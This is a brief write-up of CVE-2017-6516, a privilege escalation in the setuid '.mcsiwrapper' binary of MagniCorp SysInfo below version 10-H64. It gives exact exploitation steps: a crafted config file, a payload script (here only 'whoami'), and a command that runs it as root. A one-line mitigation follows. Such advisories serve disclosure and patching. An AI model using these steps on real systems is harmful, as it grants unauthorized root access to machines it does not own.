# CVE-2017-6516

CVE-2017-6516 is a privilege escalation vulnerability that targets the `.mcsiwrapper` binary from MagniCorp SysInfo under version 10-H64. When this binary has the SUID bit set and is outdated, a user may execute arbitrary code as the owner of the binary - which is often `root`.

## Requirements

- The binary `.mcsiwrapper` must be setuid:
```bash
$ ls -l .mcsiwrapper
-rwsr-xr-x 1 root root .mcsiwrapper
```
- The binary `.mcsiwrapper` must be under version 10-H64:
```bash
$ .mcsiwrapper --version
<Version under 10-H64>
```

## Exploitation
Create a file `config` with the following contents:
```bash
ExecPath=<Path to a writeable directory>
```

Create a payload executable file in the `ExecPath` directory, for instance:
```bash
#!/bin/sh
whoami
```
And make it executable:
```bash
$ chmod +x payload
```

Run the command:
```bash
$ bash -c "exec -a payload .mcsiwrapper --configfile <path to config file>"
root
```

## Mitigations
Update `.mcsiwrapper` to at least 10-H64.
